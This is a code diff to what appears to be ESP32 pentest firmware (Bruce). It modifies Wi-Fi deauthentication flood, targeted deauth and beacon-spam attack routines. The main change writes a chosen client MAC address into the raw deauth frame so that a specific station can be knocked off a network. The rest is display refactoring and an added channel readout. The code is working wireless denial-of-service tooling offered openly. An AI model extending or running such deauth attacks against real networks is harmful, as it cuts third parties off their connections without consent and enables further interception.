@@ -51,20 +51,29 @@ void send_raw_frame(const uint8_t *frame_buffer, int size)
 ** function: wsl_bypasser_send_raw_frame
 ** @brief: prepare the frame to deploy the attack
 ***************************************************************************************/
-void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan)
+void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6])
 {
   Serial.begin(115200);
-  Serial.print("\nPreparing deauth frame to -> ");
+  Serial.print("\nPreparing deauth frame to AP -> ");
   for (int j = 0; j < 6; j++)
   {
     Serial.print(ap_record->bssid[j], HEX);
     if (j < 5)
       Serial.print(":");
   }
+  Serial.print(" and Tgt: ");
+    for (int j = 0; j < 6; j++)
+  {
+    Serial.print(target[j], HEX);
+    if (j < 5)
+      Serial.print(":");
+  }
+
   esp_err_t err;
   err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
   if(err!= ESP_OK) Serial.println("Error changing channel");
   delay(50);
+  memcpy(&deauth_frame[4] , target          , 6); // Client MAC Address for Station Deauth
   memcpy(&deauth_frame[10], ap_record->bssid, 6);
   memcpy(&deauth_frame[16], ap_record->bssid, 6);
 }
@@ -119,7 +128,7 @@ void wifi_atk_menu()
   {
     int nets;
     WiFi.mode(WIFI_MODE_STA);
-    displayRedStripe("Scanning..", TFT_WHITE, bruceConfig.priColor);
+    displaySomething("Scanning..");
     nets = WiFi.scanNetworks();
     ap_records.clear();
     options = {};
@@ -163,7 +172,7 @@ void deauthFloodAttack()
   int nets;
   WiFi.mode(WIFI_AP);
 ScanNets:
-  displayRedStripe("Scanning..", TFT_WHITE, bruceConfig.priColor);
+  displaySomething("Scanning..");
   nets = WiFi.scanNetworks();
   ap_records.clear();
   for (int i = 0; i < nets; i++)
@@ -180,7 +189,7 @@ ScanNets:
   uint32_t rescan_counter = millis();
   uint16_t count = 0;
   uint8_t channel=0;
-  drawMainBorder(true);
+  drawMainBorderWithTitle("Deauth Flood");
   while (true)
   {
     for (const auto &record : ap_records)
@@ -197,13 +206,13 @@ ScanNets:
     // Update counter every 2 seconds
     if (millis() - lastTime > 2000)
     {
-      tft.setCursor(10, 28);
-      tft.setTextColor(bruceConfig.priColor,bruceConfig.bgColor);
-      tft.println("Deauth Flood");
+      drawMainBorderWithTitle("Deauth Flood");
       tft.setCursor(10, HEIGHT - 25);
       tft.print("Frames:               ");
       tft.setCursor(10, HEIGHT - 25);
       tft.println("Frames: " + String(count / 2) + "/s   ");
+      tft.setCursor(10, HEIGHT - 45);
+      tft.println("Channel " + String(channel) + "    ");
       count = 0;
       lastTime = millis();
     }
@@ -277,13 +286,12 @@ void target_atk(String tssid, String mac, uint8_t channel)
     if (redraw)
     {
       // desenhar a tela
-      drawMainBorder();
-      tft.setTextColor(TFT_RED,bruceConfig.bgColor);
-      tft.drawCentreString("Target Deauth", tft.width() / 2, 28, SMOOTH_FONT);
+      drawMainBorderWithTitle("Target Deauth");
       tft.setTextColor(bruceConfig.priColor,bruceConfig.bgColor);
-      tft.drawString("AP: " + tssid, 15, 48);
-      tft.drawString("Channel: " + String(channel), 15, 66);
-      tft.drawString(mac, 15, 84);
+      padprintln("");
+      padprintln("AP: " + tssid);
+      padprintln("Channel: " + String(channel));
+      padprintln(mac);
       delay(50);
       redraw = false;
     }
@@ -301,7 +309,7 @@ void target_atk(String tssid, String mac, uint8_t channel)
     // Pause attack
     if (checkSelPress())
     {
-      displayRedStripe("Deauth Paused", TFT_WHITE, bruceConfig.priColor);
+      displaySomething("Deauth Paused");
       while (checkSelPress())
       {
         delay(50);
@@ -572,10 +580,10 @@ void beaconAttack()
 
   wifiConnected = true; // display wifi icon
   // drawMainMenu(0);
-  displayRedStripe(txt, TFT_WHITE, bruceConfig.priColor);
+  displaySomething(txt);
   while (1)
   {
-    displayRedStripe(String(txt), TFT_WHITE, bruceConfig.priColor);
+    displaySomething(String(txt));
     delay(200);
     if (BeaconMode == 0)
     {
